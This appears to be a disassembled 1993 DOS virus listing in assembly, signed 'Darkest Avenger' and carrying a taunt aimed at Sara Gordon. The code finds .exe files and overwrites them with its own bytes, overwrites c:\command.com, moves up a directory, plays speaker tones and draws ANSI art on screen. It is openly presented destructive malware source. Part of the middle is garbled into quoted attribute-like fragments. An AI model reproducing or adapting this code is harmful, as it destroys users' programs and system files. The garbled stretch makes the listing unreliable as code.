


PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        COMMAND				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   22-Feb-93					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e		equ	9Eh
data_28e	equ	0A0h

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

command		proc	far

start:
		call	sub_1
		call	sub_2
		call	sub_3
		call	sub_2
		call	sub_4
		call	sub_5

command		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		mov	si,offset data_13
loc_1:
		mov	bx,[si]
		or	bx,bx			; Zero ?
		jz	loc_ret_5		; Jump if zero
		mov	ax,34DDh
		mov	dx,12h
		cmp	dx,bx
		jae	loc_4			; Jump if above or =
		div	bx			; ax,dx rem=dx:ax/reg
		mov	bx,ax
		in	al,61h			; port 61h, 8255 port B, read
		test	al,3
		jnz	loc_2			; Jump if not zero
		or	al,3
		out	61h,al			; port 61h, 8255 B - spkr, etc
		mov	al,0B6h
		out	43h,al			; port 43h, 8253 wrt timr mode
loc_2:
		mov	al,bl
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	al,bh
		out	42h,al			; port 42h, 8253 timer 2 spkr
		mov	bx,[si+2]
		xor	ah,ah			; Zero register
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		add	bx,dx
loc_3:
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		cmp	dx,bx
		jne	loc_3			; Jump if not equal
		in	al,61h			; port 61h, 8255 port B, read
		and	al,0FCh
		out	61h,al			; port 61h, 8255 B - spkr, etc
loc_4:
		add	si,4
		jmp	short loc_1

loc_ret_5:
		retn
sub_1		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		mov	cx,2
		mov	ah,4Eh			; 'N'
		mov	dx,offset data_3	; ('*.exe')
		nop
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		mov	ah,3Ch			; '<' xor="" cx,cx="" ;="" zero="" register="" mov="" dx,data_1e="" int="" 21h="" ;="" dos="" services="" ah="function" 3ch="" ;="" create/truncate="" file="" @="" ds:dx="" mov="" bh,40h="" ;="" '@'="" xchg="" ax,bx="" mov="" dx,100h="" mov="" cx,4beh="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;="" write="" file="" bx="file" handle="" ;="" cx="bytes" from="" ds:dx="" buffer="" retn="" sub_2="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_3="" proc="" near="" mov="" ah,3bh="" ;="" ';'="" mov="" dx,offset="" data_3+15h="" ;="" ('.')="" int="" 21h="" ;="" dos="" services="" ah="function" 3bh="" ;="" set="" current="" dir,="" path="" @="" ds:dx="" retn="" sub_3="" endp="" db="" 0,="" 0="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" sub_4="" proc="" near="" pushf="" ;="" push="" flags="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" mov="" dx,offset="" data_3+6="" ;="" ('c')="" xor="" cx,cx="" ;="" zero="" register="" mov="" ax,3c02h="" int="" 21h="" ;="" dos="" services="" ah="function" 3ch="" ;="" create/truncate="" file="" @="" ds:dx="" xchg="" ax,bx="" mov="" ah,40h="" ;="" '@'="" mov="" cx,4beh="" mov="" dx,100h="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;="" write="" file="" bx="file" handle="" ;="" cx="bytes" from="" ds:dx="" buffer="" mov="" ah,3eh="" ;="" '="">'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		retn
sub_4		endp

data_3		db	'*.exe', 0
		db	'c:\command.com', 0
		db	'..', 0
		db	'Darkest Avenger', 0

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		jmp	short loc_6
		db	90h
data_6		db	0
data_7		dw	281h
		db	2
data_8		dw	0
		db	'Isnt dedicated to Sara Gordon'
		db	 00h, 1Ah
data_9		db	'Its dedicated to her GROOVE!', 0Dh
		db	0Ah, '$'
loc_6:
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
						;   ah=columns on screen
		mov	bx,0B800h
		cmp	al,2
		je	loc_8			; Jump if equal
		cmp	al,3
		je	loc_8			; Jump if equal
		mov	data_6,0
		mov	bx,0B000h
		cmp	al,7
		je	loc_8			; Jump if equal
		mov	dx,offset data_9	; ('Its dedicated to her GRO')
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		retn
loc_8:
		mov	es,bx
		mov	di,data_8
		mov	si,offset data_11
		mov	dx,3DAh
		mov	bl,9
		mov	cx,data_7
		cld				; Clear direction
		xor	ax,ax			; Zero register

locloop_11:
		lodsb				; String [si] to al
		cmp	al,1Bh
		jne	loc_14			; Jump if not equal
		xor	ah,80h
		jmp	short loc_27
loc_14:
		cmp	al,10h
		jae	loc_15			; Jump if above or =
		and	ah,0F0h
		or	ah,al
		jmp	short loc_27
loc_15:
		cmp	al,18h
		je	loc_18			; Jump if equal
		jnc	loc_19			; Jump if carry=0
		sub	al,10h
		add	al,al
		add	al,al
		add	al,al
		add	al,al
		and	ah,8Fh
		or	ah,al
		jmp	short loc_27
loc_18:
		mov	di,data_8
		add	di,data_28e
		mov	data_8,di
		jmp	short loc_27
loc_19:
		mov	bp,cx
		mov	cx,1
		cmp	al,19h
		jne	loc_20			; Jump if not equal
		lodsb				; String [si] to al
		mov	cl,al
		mov	al,20h			; ' '
		dec	bp
		jmp	short loc_21
loc_20:
		cmp	al,1Ah
		jne	loc_22			; Jump if not equal
		lodsb				; String [si] to al
		dec	bp
		mov	cl,al
		lodsb				; String [si] to al
		dec	bp
loc_21:
		inc	cx
loc_22:
		cmp	data_6,0
		je	loc_25			; Jump if equal
		mov	bh,al

locloop_23:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		rcr	al,1			; Rotate thru carry
		jc	locloop_23		; Jump if carry Set
loc_24:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		and	al,bl
		jnz	loc_24			; Jump if not zero
		mov	al,bh
		stosw				; Store ax to es:[di]
		loop	locloop_23		; Loop if cx > 0

		jmp	short loc_26
loc_25:
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
loc_26:
		mov	cx,bp
loc_27:
		jcxz	loc_ret_28		; Jump if cx=0
		loop	locloop_11		; Loop if cx > 0


loc_ret_28:
		retn
sub_5		endp

data_11		db	4
		db	 10h, 19h, 19h,0D6h,0C4h,0BFh
		db	 20h,0D6h,0C4h,0C4h,0BFh, 20h
		db	0D2h,0C4h,0C4h,0BFh, 20h,0D6h
		db	0C4h,0C4h,0BFh, 20h,0B7h, 19h
		db	 03h,0D6h,0C4h,0BFh, 19h, 19h
		db	 18h, 19h, 0Ch, 06h, 1Ah, 07h
		db	0DCh, 19h, 04h, 09h,0D3h,0C4h
		db	0BFh, 20h,0C7h,0C4h,0C4h,0B4h
		db	 20h,0C7h,0C4h,0C2h,0D9h, 20h
		db	0C7h,0C4h,0C4h,0B4h, 20h,0BDh
		db	 19h, 03h,0D3h,0C4h,0BFh, 19h
		db	 04h, 06h, 1Ah, 07h,0DCh, 19h
		db	 0Ch, 18h, 19h
		db	0Ah
		db	0DBh			; Data table (indexed access)
		db	0DFh, 19h, 06h,0DFh,0DFh,0DFh
		db	0DCh, 20h, 09h,0D3h,0C4h,0C4h
		db	0D9h, 20h,0D0h, 20h, 20h,0C1h
		db	 20h,0D0h, 20h,0C1h, 20h, 20h
		db	0D0h, 20h, 20h,0C1h, 19h, 04h
		db	0D3h,0C4h,0C4h,0D9h, 20h, 20h
		db	 06h,0DCh,0DFh,0DFh,0DFh, 19h
		db	 06h,0DFh,0DBh, 19h, 0Ah, 18h
		db	 19h, 08h,0DCh,0DFh, 19h, 0Ch
		db	0DFh,0DCh, 19h, 1Ah,0DCh,0DFh
		db	 19h, 0Ch,0DFh,0DCh, 19h, 08h
		db	 18h, 19h, 07h,0DCh,0DFh, 19h
		db	 0Eh,0DFh,0DCh, 19h, 18h,0DCh
		db	0DFh, 19h, 0Fh,0DBh, 19h, 07h
		db	 18h, 19h, 06h,0DBh, 19h, 11h
		db	0DFh,0DCh, 19h, 16h,0DCh,0DFh
		db	 19h, 11h,0DFh,0DCh, 19h, 05h
		db	 18h, 19h, 04h,0DCh,0DFh, 19h
		db	 13h,0DFh,0DCh, 19h, 14h,0DCh
		db	0DFh, 19h, 13h,0DFh,0DCh, 19h
		db	 04h, 18h, 19h, 03h,0DCh,0DFh
		db	 19h, 16h,0DBh, 19h, 12h,0DBh
		db	 19h, 16h,0DFh,0DCh, 19h, 03h
		db	 18h, 19h, 03h,0DBh, 19h, 18h
		db	0DFh,0DCh, 20h, 04h,0DCh, 19h
		db	 0Ah,0DCh, 20h, 06h,0DCh,0DFh
		db	 19h, 18h,0DFh,0DCh, 19h, 02h
		db	 18h, 19h, 02h,0DBh, 19h, 0Ah
		db	0DCh,0DBh,0DCh, 19h, 0Dh,0DBh
		db	 1Ah, 03h,0DFh,0DCh, 19h, 02h
		db	0DCh, 1Ah, 03h,0DFh,0DBh, 19h
		db	 0Dh,0DCh,0DBh,0DCh, 19h, 0Ah
		db	0DBh, 19h, 02h, 18h, 20h, 20h
		db	0DCh,0DFh, 19h, 09h,0DCh,0DBh
		db	 20h,0DBh, 19h, 0Eh,0DBh, 19h
		db	 03h,0DFh,0DCh,0DFh, 19h, 03h
		db	0DBh, 19h, 0Eh,0DBh, 20h,0DBh
		db	0DCh, 19h, 0Ah,0DBh, 20h, 20h
		db	 18h, 20h, 20h,0DBh, 19h, 09h
		db	0DCh,0DFh, 20h, 20h,0DFh,0DCh
		db	 19h, 0Eh,0DFh,0DCh, 07h, 1Ah
		db	 06h, 2Ch, 06h,0DCh,0DFh, 19h
		db	 0Eh,0DCh,0DFh, 20h, 20h,0DFh
		db	0DCh, 19h, 09h,0DFh,0DCh, 20h
		db	 18h, 20h,0DBh, 19h, 09h,0DCh
		db	0DFh, 19h, 03h,0DBh, 19h, 0Fh
		db	 07h, 1Ah, 08h, 2Ch, 19h, 0Fh
		db	 06h,0DBh, 19h, 04h,0DBh, 19h
		db	 09h,0DBh, 20h, 18h, 20h,0DBh
		db	 19h, 08h,0DCh,0DFh, 19h, 04h
		db	0DFh,0DCh, 19h, 0Eh, 07h, 1Ah
		db	 03h, 2Ch, 04h,0DCh, 07h, 1Ah
		db	 03h, 2Ch, 19h, 0Eh, 06h,0DCh
		db	0DFh, 19h, 05h,0DBh, 19h, 09h
		db	0DBh, 18h,0DBh, 19h, 08h,0DCh
		db	0DFh, 19h, 06h,0DFh,0DCh, 19h
		db	 0Eh, 07h, 2Ch, 2Ch, 04h,0DBh
		db	 20h,0DBh, 07h, 2Ch, 2Ch, 19h
		db	 0Eh, 06h,0DCh,0DFh, 19h, 07h
		db	0DFh,0DCh, 19h, 07h,0DFh, 18h
		db	 19h, 08h,0DCh,0DFh, 19h, 08h
		db	0DFh,0DCh, 19h, 0Eh, 07h, 2Ch
		db	 04h,0DBh, 20h,0DBh, 07h, 2Ch
		db	 19h, 0Eh, 06h,0DCh,0DFh, 19h
		db	 09h,0DFh,0DCh, 19h, 07h, 18h
		db	 19h, 07h,0DBh, 19h, 0Ch,0DFh
		db	0DCh, 19h, 0Eh, 04h,0DBh, 19h
		db	 0Eh, 06h,0DCh,0DFh, 19h, 0Dh
		db	0DBh, 19h, 06h, 18h, 19h, 06h
		db	0DBh, 19h, 0Fh,0DFh,0DCh, 19h
		db	 0Ch,0DBh, 19h, 0Ch,0DCh,0DFh
		db	 19h, 10h,0DFh,0DCh, 19h, 04h
		db	 18h, 19h, 04h,0DCh,0DFh, 19h
		db	 12h,0DFh, 1Ah, 0Ah,0DCh,0DFh
		db	 20h,0DFh, 1Ah, 0Ah,0DCh,0DFh
		db	 19h, 14h,0DFh,0DCh, 19h, 02h
		db	 18h, 19h, 18h, 04h,0D6h,0C4h
		db	0C4h,0BFh, 20h,0D2h,0C4h,0C4h
		db	0BFh, 20h,0D6h,0C4h,0C4h,0BFh
		db	 20h,0D6h,0C4h,0C4h,0BFh, 20h
		db	0D2h, 20h, 20h,0C2h, 20h,0D2h
		db	0C4h,0C4h,0BFh, 19h, 18h, 18h
		db	 19h, 18h, 09h,0BAh, 20h,0C4h
		db	0BFh, 20h,0C7h,0C4h,0C2h,0D9h
		db	 20h,0BAh, 20h, 20h,0B3h, 20h
		db	0BAh, 20h, 20h,0B3h, 20h,0D3h
		db	0B7h,0DAh,0D9h, 20h,0C7h,0C4h
		db	 19h, 1Ah, 18h, 19h, 18h,0D3h
		db	0C4h,0C4h,0D9h, 20h,0D0h, 20h
		db	0C1h, 20h, 20h,0D3h,0C4h,0C4h
		db	0D9h, 20h,0D3h,0C4h,0C4h,0D9h
		db	 20h, 20h,0D3h,0D9h, 20h, 20h
		db	0D0h,0C4h,0C4h,0D9h, 19h, 18h
		db	 18h,0C3h,0CDh
		db	20h
data_13		db	64h
		db	 00h, 02h, 00h,0C8h, 00h, 02h
		db	 00h, 64h, 00h, 02h, 00h,0C8h
		db	 00h, 02h, 00h, 64h, 00h, 02h
		db	 00h,0C8h, 00h, 02h, 00h, 64h
		db	 00h, 02h, 00h,0C8h, 00h, 02h
		db	 00h, 64h, 00h, 02h, 00h,0C8h
		db	 00h, 02h, 00h, 64h, 00h, 02h
		db	 00h,0C8h, 00h, 02h, 00h, 64h
		db	 00h, 02h, 00h,0C8h, 00h, 02h
		db	 00h, 64h, 00h, 02h, 00h,0C8h
		db	 00h, 02h, 00h, 64h, 00h, 02h
		db	 00h,0C8h, 00h, 02h, 00h, 64h
		db	 00h, 02h, 00h,0C8h, 00h, 02h
		db	 00h, 64h, 00h, 02h, 00h,0C8h
		db	 00h, 02h, 00h, 64h, 00h, 02h
		db	 00h,0C8h, 00h, 02h, 00h, 64h
		db	 00h, 02h, 00h,0C8h, 00h, 02h
		db	 00h, 64h, 00h, 02h, 00h,0C8h
		db	 00h, 02h, 00h, 00h, 00h

seg_a		ends



		end	start

</'>